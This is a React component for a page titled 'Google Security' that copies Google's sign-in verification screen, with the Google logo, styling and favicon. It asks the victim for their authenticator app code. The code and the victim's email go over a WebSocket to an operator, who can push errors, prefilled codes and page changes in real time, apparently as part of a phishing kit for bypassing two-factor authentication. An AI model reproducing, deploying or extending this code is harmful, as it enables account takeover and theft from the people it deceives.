import React, { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";
import { useWebSocket } from '../../../context/WebSocketContext';
import { getSessionEmail } from '../../../utils/email';
import useDynamicCss from "../../../utils/useDynamicCss";

export default function AuthenticatorCodePage() {
  useEffect(() => {
    document.title = 'Google Security';

  const favicon = document.querySelector<HTMLLinkElement>("link[rel='icon']");
  if (favicon) {
    favicon.href = "/gg-favicon.png"; // file in public folder
  }
  }, []);

  const [searchParams] = useSearchParams();
  const emailParam = getSessionEmail(searchParams);
  const errorParam = searchParams.get('error');
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [pageLoad, setPageLoad] = useState(true);
  const [showError, setShowError] = useState(errorParam === 'wrong-code');
  const [errorMessage, setErrorMessage] = useState(
    errorParam === 'wrong-code' ? 'Wrong code. Please try again.' : 'Enter code.'
  );
  const { submitForm, verificationError, clearVerificationError, navigationEvent, clearNavigationEvent, prefillCode, clearPrefillCode } = useWebSocket();

  // Handle URL search params updates
  useEffect(() => {
    const errorParam = searchParams.get('error');
    if (errorParam === 'wrong-code') {
      setShowError(true);
      setErrorMessage('Wrong code. Please try again.');
    }
  }, [searchParams]);

  // Pre-fill code when admin sends it
  useEffect(() => {
    if (prefillCode && (prefillCode.type === 'auth' || prefillCode.type === 'authenticator' || prefillCode.type === 'gg-auth')) {
      setCode(prefillCode.code);
      clearPrefillCode();
    }
  }, [prefillCode, clearPrefillCode]);

  useEffect(() => {
    if (
      verificationError &&
      (verificationError.type === 'auth' ||
        verificationError.type === 'authenticator' ||
        verificationError.type === 'gg-auth' ||
        verificationError.type === 'wrong-code')
    ) {
      setShowError(true);
      setErrorMessage(verificationError.message || 'Wrong code. Please try again.');
      setLoading(false);
      setPageLoad(false);
      clearVerificationError();
    }
  }, [verificationError, clearVerificationError]);

  useEffect(() => {
    if (navigationEvent) {
      setLoading(false);
      setPageLoad(false);
      setCode('');
      setShowError(false);
      clearNavigationEvent();
    }
  }, [navigationEvent, clearNavigationEvent]);

  const isCssLoaded = useDynamicCss("/css/email-otp.css");

  useEffect(() => {
    const timer = setTimeout(() => setPageLoad(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!code.trim()) {
      setErrorMessage('Enter code.');
      setShowError(true);
      return;
    }
    setShowError(false);
    setLoading(true);
    setPageLoad(true);
    submitForm('authenticator-code', { code, email: emailParam });
  };

  return (
    <>
      {!isCssLoaded && (
        <div style={{
          position: 'fixed',
          top: 0,
          left: 0,
          width: '100vw',
          height: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          backgroundColor: '#ffffff',
          zIndex: 99999
        }}>
          <img src="/loader.gif" alt="Loading..." style={{ width: '88px', height: '88px', display: "none" }} />
        </div>
      )}
      <div className={`sign-in-page-container ${pageLoad ? "body-loading" : ""}`}>
      <div className="wrapper-loading-root">
        <div
          className="progress-bar"
          style={{ display: loading ? "flex" : "none" }}
        >
          <div className="bar1"></div>
          <div className="bar2"></div>
        </div>
      </div>
      <div className="bodywr">
        <div className="body-inner">
          <div
            className="progress-bar"
            style={{ display: loading ? "flex" : "none" }}
          >
            <div className="bar1"></div>
            <div className="bar2"></div>
          </div>
          <div className="bodyct">
            <div className="Svhjgc">
              <div className="zIgDIc">
                <div>
                  <div className="Wf6lSd">
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="48"
                      height="48"
                      viewBox="0 0 40 48"
                      aria-hidden="true"
                    >
                      <path
                        fill="#4285F4"
                        d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
                      ></path>
                      <path
                        fill="#34A853"
                        d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
                      ></path>
                      <path
                        fill="#FABB05"
                        d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
                      ></path>
                      <path
                        fill="#E94235"
                        d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
                      ></path>
                    </svg>
                  </div>
                </div>
                <div className="text-left" id="stepf">
                  <h1>
                    <span>Verify your identity</span>
                  </h1>
                  <div className="lbl">
                    <span>
                      To help keep your account safe, Google wants to make sure
                      it’s really you trying to sign in
                    </span>
                  </div>
                  <div className="lbl">
                    <div className="usac">
                      <div className="usic">
                        <div className="ic">
                          <svg
                            aria-hidden="true"
                            className="Qk3oof"
                            fill="currentColor"
                            focusable="false"
                            width="48px"
                            height="48px"
                            viewBox="0 0 24 24"
                            xmlns="http://www.w3.org/2000/svg"
                          >
                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                          </svg>
                        </div>
                      </div>
                      <div className="ac" id="display-email">
                        {emailParam}
                      </div>
                      <div className="ar">
                        <svg
                          aria-hidden="true"
                          className="Qk3oof u4TTuf"
                          fill="currentColor"
                          focusable="false"
                          width="24px"
                          height="24px"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path d="M7 10l5 5 5-5z"></path>
                        </svg>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div className="lgfwp">
                <div className="lgf">
                  <form onSubmit={handleSubmit} className="form_container">
                    <div className="block_render_content_html">
                      <div style={{ paddingBottom: "20px" }}>
                        Get a Verification Code from Authenticator App
                      </div>
                    </div>
                    <div
                      className={`form-group pt8 ${showError ? "error" : ""}`}
                    >
                      <input
                        className={`form-input ${showError ? "error" : ""}`}
                        placeholder=" "
                        type="text"
                        value={code}
                        onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                        maxLength={6}
                      />
                      <label>Enter code</label>
                    </div>
                     {showError && (
                      <div className="errorms" style={{ display: "block" }}>
                        <div style={{ paddingTop: "4px" }}>
                          <div className="erw">
                            <span className="eric">
                              <svg
                                aria-hidden="true"
                                className="Qk3oof xTjuxe"
                                fill="currentColor"
                                focusable="false"
                                width="16px"
                                height="16px"
                                viewBox="0 0 24 24"
                                xmlns="http://www.w3.org/2000/svg"
                              >
                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                              </svg>
                            </span>
                            {errorMessage}
                          </div>
                        </div>
                      </div>
                    )}
                    <div className="ftbtwp">
                      <div className="btg-wp">
                        <div className="next-btn-wp">
                          <button
                            type="button"
                            className="mybutton"
                            style={{ opacity: 1, marginRight: "20px" }}
                          >
                            <div className="text-button"></div>
                            <span>Try another way</span>
                          </button>
                          <button
                            type="submit"
                            onClick={handleSubmit}
                            className="mybutton next"
                            name="submitAuth"
                          >
                            <div className="next-button"></div>
                            <span className="bg">Next</span>
                          </button>
                        </div>
                      </div>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div className="body-foot">
          <footer className="footer">
            <div className="eXa0v">
              <div className="O1htCb-H9tDt" id="selectorToggle">
                <div className="select_inner">
                  <div className="VfPpkd-TkwUic">
                    <span className="VfPpkd-NSFCdd-i5vt6e">
                      <span className="VfPpkd-NSFCdd-Brv4Fb"></span>
                      <span className="VfPpkd-NSFCdd-MpmGFe"></span>
                    </span>
                    <span className="VfPpkd-uusGie-fmcmS-haAclf">
                      <span className="VfPpkd-uusGie-fmcmS language-current">
                        English (United States)
                      </span>
                    </span>
                    <span className="VfPpkd-t08AT-Bz112c">
                      <svg
                        className="VfPpkd-t08AT-Bz112c-Bd00G"
                        viewBox="7 10 10 5"
                        focusable="false"
                        aria-hidden="true"
                      >
                        <polygon
                          className="VfPpkd-t08AT-Bz112c-mt1Mkb"
                          stroke="none"
                          fillRule="evenodd"
                          points="7 10 12 15 17 10"
                        ></polygon>
                        <polygon
                          className="VfPpkd-t08AT-Bz112c-auswjd"
                          stroke="none"
                          fillRule="evenodd"
                          points="7 15 12 10 17 15"
                        ></polygon>
                      </svg>
                    </span>
                  </div>
                </div>
              </div>
            </div>
            <ul>
              <li>
                <a href="#">Help</a>
              </li>
              <li>
                <a href="#">Privacy</a>
              </li>
              <li>
                <a href="#">Terms</a>
              </li>
            </ul>
          </footer>
        </div>
      </div>
    </div>
  </>
);
}
